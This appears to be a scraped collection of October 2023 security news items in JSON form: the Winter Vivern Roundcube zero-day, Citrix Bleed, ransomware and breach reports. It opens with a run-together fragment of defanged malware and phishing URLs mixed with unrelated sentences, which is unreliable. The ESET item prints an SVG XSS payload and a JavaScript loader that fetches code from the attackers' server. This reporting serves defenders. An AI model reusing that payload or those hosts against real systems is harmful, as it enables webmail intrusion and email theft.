]phphxxp[://]168[.]100[.]8[.]21/startpng[.]jshxxp[://]168[.]100[.]8[.]21/win[.]htahxxp[://]46[.]161[.]40[.]164/main2[.]exehxxp[://]46[.]161[.]40[.]164/main[.]exehxxp[://]tpp[.]tj/BossMaster[.]txthxxp[://]tpp[.]tj/T/rat[.]jshxxps[://]tpp[.]tj/main[.]exehxxps[://]tpp[.]tj/T/file[.]jshxxps[://]tpp[.]tj/T/png[.]phphxxps[://]tpp[.]tj/T/startpng[.]jshxxps[://]tpp[.]tj/T/sys[.]htahxxps[://]tpp[.]tj/rightupsbot[.]txthxxp[://]168[.]100[.]8[.]242/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/hxxp[://]168[.]100[.]8[.]242/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/index_files/2208281[.]pdfhxxp[://]168[.]100[.]8[.]242/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/index_files/Az[.]pdfhxxp[://]168[.]100[.]8[.]242/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/logout&_token=DFaH9AmHXbZKTApPbTvES2llxU6GZTl3hxxp[://]168[.]100[.]8[.]36/+CSCO+0075676763663A2F2F31302E3130302E3230302E32++/+CSCO+0075676763663A2F2F31302E3130302E3230302E32++/logout&_token=DFaH9AmHXbZKTApPbTvES2llxU6GZTl3/hxxp[://]168[.]100[.]8[.]36/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/index_files/file[.]phphxxp[://]168[.]100[.]8[.]36/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/index_files/login[.]phphxxp[://]168[.]100[.]8[.]36/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/logout&_token=DFaH9AmHXbZKTApPbTvES2llxU6GZTl3hxxp[://]206[.]166[.]251[.]146/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/index_files/Az[.]pdfhxxp[://]206[.]166[.]251[.]146/0075676763663A2F2F31302E3130302E3230302E32/0075676763663A2F2F31302E3130302E3230302E32/logout&_token=DFaH9AmHXbZKTApPbTvES2llxU6GZTl3hxxps[://]auth[.]mail-ru[.]link/public_html/home/files/login[.]php?email=1hxxps[://]e[.]mail[.]az-link[.]email/hxxps[://]e[.]mail[.]az-link[.]email/public/security/files/Az%C9%99rbaycan_Litva[.]jpghxxps[://]e[.]mail[.]az-link[.]email/public/security/files/login[.]php?email=1hxxps[://]mail[.]asco[.]az-link[.]email/5676763663A2F2F31302E3130302E3230302E32/75676763663A2F2F31302E3130302E3230302E32/login[.]phphxxps[://]mail[.]asco[.]az-link[.]email/Login[.]aspxhxxps[://]redirect[.]az-link[.]email/hxxps[://]redirect[.]az-link[.]email/5676763663A2F2F31302E3130302E3230302E32/75676763663A2F2F31302E3130302E3230302E32/Login[.]aspx&_token=oazjTiA255F2DIeYJjCXjEKnowing the common scams is an important step in using the platform safely. The following recommendations help players not fall into scams.Since April 2022, Cisco Talos has been tracking a malicious campaign operated by the espionage-motivated Arid Viper advanced persistent threat (APT) group targeting Arabic-speaking Android users.The threat actors behind the Qakbot malware have been conducting a campaign since early August 2023 in which they have been distributing Ransom Knight ransomware and the Remcos backdoor via phishing emails."
   },
   {
      "time": "2023-10-27",
      "title": "Winter Vivern exploits zero-day vulnerability in Roundcube Webmail servers",
      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchESET Research recommends updating Roundcube Webmail to the latest available version as soon as possible\n25 Oct 2023\n • \n, \n5 min. read\nAccording to ESET telemetry data, the campaign targeted Roundcube Webmail servers belonging to governmental entities and a think tank, all in Europe.We would like to thank the Roundcube developers for their quick reply and for patching the vulnerability in such a short time frame.At first sight, the email doesn’t seem malicious – but if we examine the HTML source code, shown in Figure 2, we can see an SVG tag at the end, which contains a base64-encoded payload.Once we decode the base64-encoded value in the href attribute of the use tag, we have:<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"> <image href=\"x\" onerror=\"eval(atob('<base64-encoded payload>'))\" /></svg>As the x value argument of the href attribute is not a valid URL, this object’s onerror attribute will be activated. Decoding the payload in the onerror attribute gives us the following JavaScript code (with the malicious URL manually defanged), which will be executed in the browser of the victim in the context of their Roundcube session:var fe=document.createElement('script');fe.src=\"https://recsecas[.]com/controlserver/checkupdate.js\";document.body.appendChild(fe);In summary, by sending a specially crafted email message, attackers are able to load arbitrary JavaScript code in the context of the Roundcube user’s browser window. No manual interaction other than viewing the message in a web browser is required.The second stage is a simple JavaScript loader named checkupdate.js and is shown in Figure 3.The final JavaScript payload – shown in Figure 4 – is able to list folders and emails in the current Roundcube account, and to exfiltrate email messages to the C&C server by making HTTP requests to https://recsecas[.]com/controlserver/saveMessage.Winter Vivern has stepped up its operations by using a zero-day vulnerability in Roundcube. Previously, it was using known vulnerabilities in Roundcube and Zimbra, for which proofs of concept are available online.Despite the low sophistication of the group’s toolset, it is a threat to governments in Europe because of its persistence, very regular running of phishing campaigns, and because a significant number of internet-facing applications are not regularly updated although they are known to contain vulnerabilities.\n\n\n\nSHA-1\n\n\nFilename\n\n\nDetection\n\n\nDescription\n\n\n\n\n\n\n97ED594EF2B5755F0549C6C5758377C0B87CFAE0\n\n\ncheckupdate.js\n\n\nJS/WinterVivern.B\n\n\nJavaScript loader.\n\n\n\n\n8BF7FCC70F6CE032217D9210EF30314DDD6B8135\n\n\nN/A\n\n\nJS/Kryptik.BIK\n\n\nJavaScript payload exfiltrating emails in Roundcube.\n\n\n\nSHA-1FilenameDetectionDescription97ED594EF2B5755F0549C6C5758377C0B87CFAE0checkupdate.jsJS/WinterVivern.BJavaScript loader.8BF7FCC70F6CE032217D9210EF30314DDD6B8135N/AJS/Kryptik.BIKJavaScript payload exfiltrating emails in Roundcube.\n\n\n\nIP\n\n\nDomain\n\n\nHosting provider\n\n\nFirst seen\n\n\nDetails\n\n\n\n\n\n\n38.180.76[.]31\n\n\nrecsecas[.]com\n\n\nM247 Europe SRL\n\n\n2023-09-28\n\n\nWinter Vivern C&C server\n\n\n\nIPDomainHosting providerFirst seenDetails38.180.76[.]31recsecas[.]comM247 Europe SRL2023-09-28Winter Vivern C&C serverteam.managment@outlook[.]comTacticIDNameDescriptionResource DevelopmentAcquire Infrastructure: DomainsWinter Vivern operators bought a domain at Registrar.eu.Acquire Infrastructure: ServerWinter Vivern operators rented a server at M247.Develop Capabilities: ExploitsWinter Vivern operators probably developed an exploit for Roundcube.Initial AccessExploit Public-Facing ApplicationWinter Vivern sent an email exploiting CVE‑2023-5631 in Roundcube.PhishingThe vulnerability is triggered via a phishing email, which should be opened in the Roundcube webmail by the victim.ExecutionExploitation for Client ExecutionThe JavaScript payload is executed by an XSS vulnerability in Roundcube.DiscoveryAccount Discovery: Email AccountThe JavaScript payload can list folders in the email account.CollectionEmail Collection: Remote Email CollectionThe JavaScript payload can exfiltrate emails from the Roundcube account.Command and ControlApplication Layer Protocol: Web ProtocolsC&C communications use HTTPs.ExfiltrationExfiltration Over C2 ChannelExfiltration is done via HTTPs and to the same C&C server.\n      Sign up for our newsletters\n    ESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-BaltistanESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-Baltistan • ESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its graveESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its grave • ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023 • ESET researchMoustachedBouncer: Espionage against foreign diplomats in BelarusESET researchPowerPool malware exploits ALPC LPE zero-day vulnerabilityESET researchA tale of two zero-daysESET researchExchange servers under siege from at least 10 APT groups\n            Award-winning news, views, and insight from the ESET security community\n          "
   },
   {
      "time": "2023-10-26",
      "title": "New England Biolabs leak sensitive data",
      "text": " Leaving environment files open to the public is one of the simplest mistakes that web admins can make, but it can have disastrous consequences. Despite leaving some of its sensitive credentials exposed, New England Biolabs seems to have dodged a bullet.On September 18th, the Cybernews research team discovered two publicly hosted environment files (.env) attributed to New England Biolabs (NEB). They included a lot of sensitive information, such as database credentials, login information for the SMTP server, enterprise payment processing information, and others.Both files were designated for the production environment, meaning they were likely used in real-time scenarios to handle operations in the company’s Canada branch.If cybercriminals had found those files first, they’d be able to send emails on behalf of the organization, access and exploit sensitive data, and even try to authorize payments.NEB is a known producer and supplier of recombinant and native enzyme reage nts for life science research. The company, founded in 1974, also provides products and services supporting genome editing, synthetic biology, and next-generation sequencing.“This leak is very significant. Environment files typically contain sensitive configuration information and credentials. Their exposure is a significant threat to organizations. If cybercriminals discover the environment file first, it puts the organization at risk of unauthorized access to critical data, potential data breaches, data tampering, financial losses, reputational damage, and legal and compliance issues,” Cybernews researchers write.“It is easy to mess up server configuration files, such as .htaccess, and overlook important restrictions. However, administrators should place the .env files in inaccessible directories, typically, the root directory. By default, the file is inaccessible, but after manual setups, updates, configurations, always do check if it stays that way,” researchers advise.As of October 5th, upon communication with the NEB, the environment files have been secured and are no longer accessible. Cybernews reached out to the NEB but received no comments before publishing this article.ne\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-26",
      "title": "Kazakh Attackers, Disguised as Azerbaijanis, Hit Former Soviet States",
      "text": " A Kazakhstan attack group with a penchant for sending phishing messages is doing its dirty work in an Azerbaijani disguise.Most of YoroTrooper's operations are routed via Azerbaijan, although the attackers do not appear to speak the Azerbaijani language.\"Our primary observation that points toward the actor being of Kazakh origin is that they speak Kazakh and Russian, both of which are official languages of Kazakhstan,\" researchers said. \"YoroTrooper frequently visits websites written in Kazakh and has used Russian in debugging and logging messages in their custom Python Remote Access Trojans.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-26",
      "title": "European govt email servers hacked using Roundcube zero-day",
      "text": " The Winter Vivern Russian hacking group has been exploiting a Roundcube Webmail zero-day in attacks targeting European government entities and think tanks since at least October 11.These security patches were pushed five days after the Slovak cybersecurity company detected Russian threat actors using the zero-day in real-world attacks.According to ESET's findings, the cyberespionage group (also known as TA473) used HTML email messages containing carefully crafted SVG documents to remotely inject arbitrary JavaScript code.Their phishing messages impersonated the Outlook Team and tried to trick potential victims into opening malicious emails, automatically triggering a first-stage payload that exploited the Roundcube email server vulnerability.The final JavaScript payload dropped in the attacks helped the malicious actors harvest and steal emails from compromised webmail servers.\"The final JavaScript payload [..] is able to list folders and emails in the current Roundcube account, and to exfiltrate email messages to the C&C server.\"Winter Vivern has been actively targeting Zimbra and Roundcube email servers owned by governmental organizations since at least 2022.These attacks included exploiting the Roundcube XSS vulnerability (CVE-2020-35730) between August and September 2023, per ESET telemetry data.\"Winter Vivern has stepped up its operations by using a zero-day vulnerability in Roundcube. Previously, it was using known vulnerabilities in Roundcube and Zimbra, for which proofs of concept are available online,\" ESET said.\"The group is a threat to governments in Europe because of its persistence, very regular running of phishing campaigns, and because a significant number of internet-facing applications are not regularly updated although they are known to contain vulnerabilities.\""
   },
   {
      "time": "2023-10-26",
      "title": "Chilean telecom giant GTD hit by the Rorschach ransomware gang",
      "text": " Chile's Grupo GTD warns that a cyberattack has impacted its Infrastructure as a Service (IaaS) platform, disrupting online services.Grupo GTD is a telecommunications company offering services throughout Latin America, with a presence in Chile, Spain, Columbia, and Peru. The company provides various IT services, including internet access, mobile and landline telephone, and data center and IT managed services.On the morning of October 23rd, GTD suffered a cyberattack that impacted numerous services, including its data centers, internet access, and Voice-over-IP (VoIP).\"We understand the importance of proactive and fluid communication in the face of incidents, therefore, in accordance with what we previously discussed on the phone, I would like to inform you that we are experiencing a partial impact on services as a result of a cybersecurity incident,\" reads a GTD security incident notification.\"This impact is limited to part of our laas platform and some shared services (IP telephony services, VPNs and OTT television system). Our communication COR, as well as our ISP, are operating normally.\"To prevent the attack's spread, the company disconnected its IaSS platform from the internet, leading to these outages.Today, Chile’s Computer Security Incident Response Team (CSIRT) confirmed that GTD suffered a ransomware attack.\"As a consequence, some public services in our country have presented unavailability on their websites.\"The CSIRT is requiring all public institutions who are utilizing GTD's IaaS services to notify the government under decree No. 273, which requires all State agencies to report when a cybersecurity incident may impact them.Rorschach ransomware (aka BabLock) is a relatively new encryptor seen by Check Point Research in April 2023. While the researchers could not link the encryptor to a particular ransomware gang, they warned that it was both sophisticated and very fast, able to encrypt a device in 4 minutes and 30 seconds.In a report on the GTD attack seen by BleepingComputer, the threat actors are utilizing DLL sideloading vulnerabilities in legitimate Trend Micro, BitDefender, and Cortex XDR executables to load a malicious DLL.This DLL is the Rorschach injector, which will inject a ransomware payload called \"config[.]ini\" into a Notepad process. Once loaded, ransomware will begin encrypting files on the device.CSIRT has shared the following IOCs related to the attack on GTD below, with u.exe and d.exe being legitimate TrendMicro and BitDefender executables used in the attack and the DLLs containing the malware.Chile’s CSIRT recommends that all organizations connected to GTD’s IaaS go through the following steps to confirm they were not breached in the attack:BleepingComputer reached out to Grupo GTD with further questions about the attack this morning but did not receive a response."
   },
   {
      "time": "2023-10-26",
      "title": "Flipper Zero can now spam Android, Windows users with Bluetooth alerts",
      "text": " A custom Flipper Zero firmware called 'Xtreme' has added a new feature to perform Bluetooth spam attacks on Android and Windows devices.The main idea behind the spam attack is to use Flipper Zero's wireless communication capabilities to spoof advertising packets and transmit them to devices in range of pairing and connection requests.This type of spam attack can confuse the target, make it difficult to discern between legitimate and spoofed devices, and even disrupt the user experience with non-stop notifications popping up on the targeted device.The admins even shared a demo video showcasing a denial of service (DoS) attack on a Samsung Galaxy device, where a constant feed of connection notifications renders the device unusable.The BLE Spam app currently gives users eight flood attack options, including:Choosing any of the above causes Flipper Zero to begin broadcasting the corresponding Bluetooth packets to pop-up connectivity prompts and notifications on devices in range.These attacks are more of an annoyance rather than a real threat. However, as BLE Spam allows users to craft custom notifications, these spams can get creative and trickier, playing a role in social engineering or other threat scenarios.Android 14 and Windows 11 devices, by default, display notifications on Bluetooth connection requests, so these Flipper Zero attacks could cause problems. Thankfully, there's an easy way to block these notifications on both systems.On Android, head to Settings → Google → Nearby Share, and turn the toggle on Show notification to the \"Off\" position.The same menu can be accessed through Settings → Connected Devices → Connection preferences → Nearby Share.On Windows, open Settings, select 'Bluetooth & devices' from the menu on the left, then click on 'Devices,' scroll down to 'Device settings,' and turn the 'Show notifications to connect using Swift Pair' toggle to the 'Off' position.Users shouldn't be too worried about rogue broadcasts of this kind, as these cannot perform code execution on recipient devices or cause direct harm.However, noting the potential for phishing is crucial, and knowing how to stop the notifications in cases of persistent pranking can save people time and frustration."
   },
   {
      "time": "2023-10-26",
      "title": "Malvertising Campaign Targets Brazil's PIX Payment System with GoPIX Malware",
      "text": " As other malvertising campaigns observed recently, users who click on the ad will be redirected via a cloaking service that is meant to filter sandboxes, bots, and others not deemed to be genuine victims.In an interesting twist, the malware can be downloaded from two different URLs depending on whether port 27275 is open on the user's machine.\"This port is used by the Avast safe banking software,\" Kaspersky explained. \"If this software is detected, a ZIP file is downloaded that contains an LNK file embedding an obfuscated PowerShell script that downloads the next stage.\"Should the port be closed, the NSIS installer package is directly downloaded. This indicates that the additional guardrail is set up explicitly to bypass the security software and deliver the malware.GoPIX functions as a clipboard stealer malware that hijacks PIX payment requests and replaces them with an attacker-controlled PIX string, which is retrieved from a command-and-control (C2) server.\"The malware also supports substituting Bitcoin and Ethereum wallet addresses,\" Kaspersky said. \"However, these are hardcoded in the malware and not retrieved from the C2. GoPIX can also receive C2 commands, but these are only related to removing the malware from the machine.\"This is not the only campaign to target users searching for messaging apps like WhatsApp and Telegram on search engines.As a result, the threat actor's device gets linked to the victim's WhatsApp accounts, granting the malicious party complete access to their chat histories and saved contacts.Meanwhile, information stealers are flourishing in the cybercrime economy, with crimeware authors flooding the underground market with malware-as-a-service (MaaS) offerings that provide cybercriminals with a convenient and cost-effective means to conduct attacks.What's more, such tools lower the entry barrier for aspiring threat actors who may lack technical expertise themselves.\"Despite having all these functionalities, the malware is relatively small in terms of size (only 50 KB), which is partly due to the fact that it is written in C,\" Kaspersky noted.\"The emerging malware is often advertised on the dark web among less skilled criminals, and distributed as MaaS, allowing its authors to grow rich quickly and endangering legitimate organizations again and again.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-26",
      "title": "Seiko says ransomware attack exposed sensitive customer data",
      "text": " Japanese watchmaker Seiko has confirmed it suffered a Black Cat ransomware attack earlier this year, warning that the incident has led to a data breach, exposing sensitive customer, partner, and personnel information.Seiko says its investigation confirmed that a total of 60,000 'items of personal data' held by its 'Group' (SGC), 'Watch' (SWC), and 'Instruments' (SII) departments were compromised by the attackers.Further information that emerged at the time suggested that BlackCat bought access to Seiko's network from an initial access broker (IAB) a day before the identification of the intrusion.Seiko investigated the breach and identified all items leaked by the ransomware gang.The company states that the following information was leaked:Seiko says it will continue to coordinate with cybersecurity specialists to bolster all IT systems and operations in the firm's network, assess the causes of the breach, and perform targeted security enhancements that will prevent similar incidents from occurring in the future.Also, each of the impacted customers, members of personnel, and business partners will be notified about the security breach individually."
   },
   {
      "time": "2023-10-26",
      "title": "Critical OAuth Flaws Uncovered in Grammarly, Vidio, and Bukalapak Platforms",
      "text": " The weaknesses, now addressed by the respective companies following responsible disclosure between February and April 2023, could have allowed malicious actors to obtain access tokens and potentially hijack user accounts.In a potential attack scenario, a threat actor could create a rogue website that offers a sign-in option through Facebook to collect the access tokens and subsequently use them against Vidio.com (which has the App ID 92356), thereby allowing full account takeover.The API security firm said it also discovered a similar issue with token verification on Bukalapak.com via Facebook login that could result in unauthorized account access.On Grammarly, it emerged that when users attempt to login to their accounts using the \"Sign in with Facebook\" option, an HTTP POST request is sent to auth.grammarly[.]com to authenticate them using a secret code.As a result, while Grammarly is not susceptible to a token reuse attack like in the case of Vidio and Bukalapak, it is nonetheless vulnerable to a different kind of problem wherein the POST request can be altered to substitute the secret code with an access token obtained from the aforementioned malicious website to gain access to the account.\"And like with the other sites, the Grammarly implementation did not perform token verification,\" Carmel said, adding, \"an account takeover would give an attacker access to the victim's stored documents.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-26",
      "title": "Citrix Bleed exploit lets hackers hijack NetScaler accounts",
      "text": " A proof-of-concept (PoC) exploit is released for the 'Citrix Bleed' vulnerability, tracked as CVE-2023-4966, that allows attackers to retrieve authentication session cookies from vulnerable Citrix NetScaler ADC and NetScaler Gateway appliances.The CVE-2023-4966 Citrix Bleed flaw is an unauthenticated buffer-related vulnerability affecting Citrix NetScaler ADC and NetScaler Gateway, network devices used for load balancing, firewall implementation, traffic management, VPN, and user authentication.By analyzing the unpatched (13.1-48.47) and patched versions (13.1-49.15) of NetScaler, Assetnote found 50 function changes.Among these functions, the researchers found two ('ns_aaa_oauth_send_openid_config' and 'ns_aaa_oauthrp_send_openid_config') that featured additional bounds checks preceding the generation of a response.These functions use 'snprintf' to insert the appropriate data into the generated JSON payload for the OpenID configuration. In the pre-patch version, the response is sent immediately without checks.The vulnerability emerges from the return value of the snprintf function, which can lead to a buffer over-read if exploited.The patched version ensures that a response will only be sent if snprintf returns a value lower than 0x20000.Armed with that knowledge, Assetnote's analysts attempted to exploit vulnerable NetScaler endpoints.During that process, they found that the hostname value used for generating the payload comes from the HTTP Host header, so one does not need administrator rights to access it.Furthermore, the hostname is inserted into the payload six times. Hence, its exploitation makes it possible to exceed the buffer limit, forcing the endpoint to respond with the buffer's contents and adjacent memory.\"While a lot of it was null bytes, there was some suspicious-looking information in the response.\"By exploiting the vulnerability thousands of times for testing, the analysts consistently located a 32-65 byte long hex string that is a session cookie.Retrieving that cookie makes it possible for attackers to hijack accounts and gain unrestricted access to vulnerable appliances.Now that a CVE-2023-4966 exploit is publicly available, it is expected that threat actors will increase their targeting of Citrix Netscaler devices to gain initial access to corporate networks.As these types of vulnerabilities are commonly used for ransomware and data theft attacks, it is strongly advised that system administrators immediately deploy patches to resolve the flaw."
   },
   {
      "time": "2023-10-26",
      "title": "VMware fixes critical code execution flaw in vCenter Server",
      "text": " VMware issued security updates to fix a critical vCenter Server vulnerability that can be exploited to gain remote code execution attacks on vulnerable servers.vCenter Server is the central management hub for VMware's vSphere suite, and it helps administrators manage and monitor virtualized infrastructure.Unauthenticated attackers can exploit it remotely in low-complexity attacks that don't require user interaction. The company says it has no evidence that the CVE-2023-34048 RCE bug is currently used in attacks.Security patches addressing this issue are now accessible through the standard vCenter Server update mechanisms. Due to the critical nature of this bug, VMware has also issued patches for multiple end-of-life products that are no longer under active support.\"While VMware does not mention end-of-life products in VMware Security Advisories, due to the critical severity of this vulnerability and lack of workaround VMware has made a patch generally available for vCenter Server 6.7U3, 6.5U3, and VCF 3.x,\" the company said.\"For the same reasons, VMware has made additional patches available for vCenter Server 8.0U1. Async vCenter Server patches for VCF 5.x and 4.x deployments have been made available.\"Because a workaround is unavailable, VMware urges admins to strictly control network perimeter access to vSphere management components and interfaces, including storage and network components.The specific network ports linked to potential exploitation in attacks targeting this vulnerability are 2012/tcp, 2014/tcp, and 2020/tcp.The company also patched a partial information disclosure vulnerability with a 4.3/10 severity CVSS base score tracked as CVE-2023-34056 that may be leveraged by threat actors with non-administrative privileges to vCenter servers to access sensitive data.\"However, all security response depends on context. Please consult with your organization's information security staff to determine the right course of action for your organization.\""
   },
   {
      "time": "2023-10-25",
      "title": "Ex-NSA Employee Pleads Guilty to Leaking Classified Data to Russia",
      "text": " A former employee of the U.S. National Security Agency (NSA) has pleaded guilty to charges accusing him of attempting to transmit classified defense information to Russia.In reality, the purported agent was an online covert employee working for the U.S. Federal Bureau of Investigation (FBI).Dalke, a former U.S. Army soldier, is also alleged to have requested $85,000 in exchange for sharing the information in his possession, which he claimed would be valuable to Russia, with the promise of sharing more documents in the future.The document transmission, which took place at Union Station in downtown Denver, Colorado, via a laptop, included five files, four of which contained Top Secret National Defense Information (NDI).Some of the excerpts offered relate to the NSA's plans to update an unspecified cryptographic program as well as threat assessments related to sensitive U.S. defense capabilities and Russia's offensive capabilities.The fifth file was a letter in which Dalke stated, \"My friends! I am very happy to finally provide this information to you. . . . I look forward to our friendship and shared benefit [sic]. Please let me know if there are desired documents to find and I will try when I return to my main office.\"Dalke was arrested by authorities on September 28, 2022, moments after the file transfer.Now having pleaded guilty, Dalke awaits his sentencing on April 26, 2024, and could face a maximum penalty of up to life in prison.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-25",
      "title": "\r\n\tPhiladelphia Alerts Public to Recent Data Breach - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistThe City of Philadelphia has issued a notice on October 20 2023, reporting a recent security breach that could affect the personal data of several individuals. The breach was first detected on May 24 2023, when suspicious activities were identified within the City’s email system. To investigate the matter, the City engaged third-party cybersecurity experts, who determined that unauthorized access to certain email accounts occurred between May 26 and July 28 2023. Significantly, on August 22 2023, the City also discovered these breached email accounts contained protected health information (PHI).A comprehensive review of the affected email accounts is currently underway to identify any potential breaches of personal information. The identified compromised data so far includes: Demographic information, such as name, address, date of birthMedical records, such as diagnosis and other treatment-related informationSocial Security numbersLimited financial data, such as claims informationOnce the identities of affected individuals are confirmed, they will receive notifications via written correspondence.“Victims are at risk of health benefits fraud, plus phishing and scam attempts that personalize their messages using personal data from the breach. They should monitor their hospital bills, credit reports and other accounts, and never click on links in unsolicited emails or text messages.”To fortify security, the City has reportedly strengthened its information protection protocols, revised existing policies and provided additional training to its staff. The incident has also been reported to the US Department of Health and Human Services, with further notifications to other regulatory bodies as necessary.Individuals who may be affected by this breach are encouraged to remain vigilant and closely monitor their accounts for any suspicious activity. "
   },
   {
      "time": "2023-10-25",
      "title": "Hackers backdoor Russian state, industrial orgs for data theft",
      "text": " Several state and key industrial organizations in Russia were attacked with a custom Go-based backdoor that performs data theft, likely aiding espionage operations.Kaspersky first detected the campaign in June 2023, while in mid-August, the cybersecurity firm spotted a newer version of the backdoor that introduced better evasion, indicating ongoing optimization of the attacks.The threat actors responsible for this campaign are unknown, and Kaspersky was limited to sharing indicators of compromise that can help defenders thwart the attacks.The attack begins with an email carrying a malicious ARJ archive named 'finansovyy_kontrol_2023_180529.rar' (financial control), which is a Nullsoft archive executable.The archive contains a decoy PDF document used for distracting the victim and an NSIS script that fetches the primary payload from an external URL address (fas-gov-ru[.]com) and launches it.The malware payload is dropped at 'C:\\ProgramData\\Microsoft\\DeviceSync\\' as 'UsrRunVGA.exe.'Kaspersky says the same phishing wave distributed two more backdoors named 'Netrunner' and 'Dmcserv.' These are the same malware with different C2 (command and control) server configurations.The script launches the malicious executables in a hidden window and adds a Start Menu link to establish persistence.The functionality of the backdoor includes the following:All data sent to the C2 server is first AES encrypted to evade detection from network monitoring solutions.To evade analysis, the malware performs username, system name, and directory checks to detect if it's running in a virtualized environment and exits if it does.The results of these checks are sent to the C2 in the initial phase of the infection to be used for victim profiling.Most notably, the new version adds a module that targets user passwords stored in 27 web browsers and the Thunderbird email client.Browsers targeted by the latest backdoor version include Chrome, Firefox, Edge, Opera, Brave, Vivaldi, and Yandex, a popular and trusted browser in Russia.The AES key has been refreshed in this malware version, and RSA asymmetric encryption has been added to protect client-C2 command and parameter communications."
   },
   {
      "time": "2023-10-25",
      "title": "Cyberattack on health services provider impacts 5 Canadian hospitals",
      "text": " A cyberattack on shared service provider TransForm has impacted operations in five hospitals in Ontario, Canada, impacting patient care and causing appointments to be rescheduled.TransForm is a not-for-profit, shared service organization founded by five hospitals in Erie St. Clair, Ontario, to manage their IT, supply chain, and accounts payable.Yesterday, the service provider released a statement stating that their IT systems are experiencing an outage due to a cyberattack.The organization says it is investigating the cause and scope of the incident, and for now, it has not yet been determined if any patient information was affected.The five hospitals impacted by the situation are:A joint statement released by the five hospitals regarding the cyberattack informs patients of problems with scheduled appointments.Those with scheduled appointments will be contacted directly to reschedule, while patients not in an emergency are advised to refrain from visiting the hospitals.\"Unfortunately, we may not be able to reach all patients, and we request your understanding if we are required to reschedule care in person at our facilities.\"\"Also, we would continue to ask if you are not needing emergency care to attend your primary care provider or local clinic to reduce the impact upon the Hospitals as we work towards addressing these issues and focus on those needing hospital care.\"As the nature of the cyberattack and the scope of the incident have not been determined, those who have received healthcare services at the mentioned institutions in the past are advised to maintain a watchful stance and treat unsolicited communications with suspicion. BleepingComputer has contacted TransForm for more details on the cyberattack, but we have not heard back by publication time."
   },
   {
      "time": "2023-10-25",
      "title": "Samsung Galaxy S23 hacked twice on first day of Pwn2Own Toronto",
      "text": " Security researchers hacked the Samsung Galaxy S23 twice during the first day of the consumer-focused Pwn2Own 2023 hacking contest in Toronto, Canada.They also demoed exploits and vulnerability chains targeting zero-days in Xiaomi's 13 Pro smartphone, as well as printers, smart speakers, Network Attached Storage (NAS) devices, and surveillance cameras from Western Digital, QNAP, Synology, Canon, Lexmark, and Sonos.\"Since the order of attempts is determined by a random draw, those who receive later slots can still claim the Master of Pwn title – even if they earn a lower cash payout.\"ZDI awarded $438,750 during the first day for 25 zero-day vulnerabilities, with Orca of Sea Security earning the highest reward of $60,000 for a Sonos Era 100 out-of-bounds read and use-after-free exploit chain.The complete list includes mobile phones (i.e., the Apple iPhone 14, Google Pixel 7, Samsung Galaxy S23, and Xiaomi 13 Pro), printers, wireless routers, network-attached storage (NAS) devices, home automation hubs, surveillance systems, smart speakers, and Google's Pixel Watch and Chromecast devices, all in their default configuration and running the latest security updates.The highest rewards are for zero-day bugs in the mobile phone category, with cash prizes of up to $300,000 for hacking the iPhone 14 and $250,000 for the Pixel 7, with more than $1,000,000 in cash available for contestants.Successfully exploiting Google and Apple devices also provides $50,000 bonuses if the exploit payloads execute with kernel-level privilege, bringing the maximum possible award for a single challenge to a total of $350,000 for a full exploit chain with kernel-level access targeting the Apple iPhone 14.On the second day of the contest, the Samsung Galaxy S23 will again be tested by security researcher Le Xich Long and hackers at vulnerability research firm Interrupt Labs."
   },
   {
      "time": "2023-10-25",
      "title": "\r\n\tHealthcare Ransomware Attacks Cost US $78bn - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineRansomware breaches have cost the US economy tens of billions of dollars in downtime alone over the past seven years, according to new research from Comparitech.The consumer awareness firm analyzed data on all known ransomware attacks affecting medical organizations between 2016 and mid-October 2023, looking at specialist IT news, data breach reports and state reporting tools.During the time period there were 539 reported attacks on healthcare organizations, impacting an estimated 9780 separate hospitals, clinics and other organizations. Over 52 million patient records were compromised, it said.Downtime varied from minimal disruption for those with frequent data backups, to months of recovery time, although the average was 14 days per organization. At nearly 19 days, 2023 is the worst year for downtime during the reporting period, followed by 2022 (16 days).Based on these figures, ransomware attacks since 2016 may have caused as many as 6347 days, or 17.4 years, of downtime.Ransom demands varied significantly, from $1600 to $10m, and were highest on average in 2021 ($4m). However, the researchers were unable to calculate or even estimate how much was lost by organizations because most victims don’t want to disclose the size of their ransom payments.Comparitech warned that there would likely be no letup in attacks in the final quarter of 2023.“With healthcare organizations witnessing an average of 18.7 days of downtime in 2023, it’s clear that 